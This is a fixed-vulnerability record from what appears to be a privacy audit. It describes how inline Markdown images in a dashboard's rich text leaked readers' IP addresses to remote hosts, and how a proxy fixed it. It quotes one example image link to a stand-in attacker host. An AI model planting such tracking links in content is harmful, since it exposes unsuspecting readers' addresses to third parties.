---
id: VULN-0045
title: A picture written into a message loads from its own site and hands every reader's address to it
status: fixed
severity: medium
cwe: CWE-359
stride: Information Disclosure
cvss: "4.3"
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N
location: dashboard/apps/web/src/components/rich-text/rich-text.tsx
component: chat/rich-text
reachability: AUTHENTICATED
exploitability: EASY
confidence: 100
discovered: 2026-11-23
last_seen: 2026-11-23
fixed: 2026-11-23
fix_commit: null
---

## Summary
Rich text (chat messages, task descriptions, notes) drew an image written as `![](https://attacker.example/x.png)` straight from that address, so every reader's browser asked the attacker's host for it - handing over their IP address and the time they read it.

## Root cause / data flow
`Media` in `rich-text.tsx` rendered `<img src>` with the written address whenever `remoteImages` was on, the default for everything except Polar's answers. Link-card pictures were already proxied (`/api/chat/links/[previewId]/image`); inline pictures were not.

## Evidence
Found by the privacy sweep recorded in `docs/privacy-exposure.md`. Regression tests are named under Remediation.

## Impact
Any member who can write in a conversation, task or note learns the address of everybody who reads it.

## Remediation
Pictures from another site are drawn through `/api/media/remote-image` (`dashboard/apps/web/src/app/api/media/remote-image/route.ts`): signed-in callers only, a per-account budget, the vetted fetch that refuses private addresses, http(s) only, images under 8 MB, never SVG, sandboxed response. Tests: `test/privacy/remote-image-proxy.test.ts`, `test/rich-text/rich-text.test.tsx`.

## History
- 2026-11-23: found and fixed in the privacy audit.
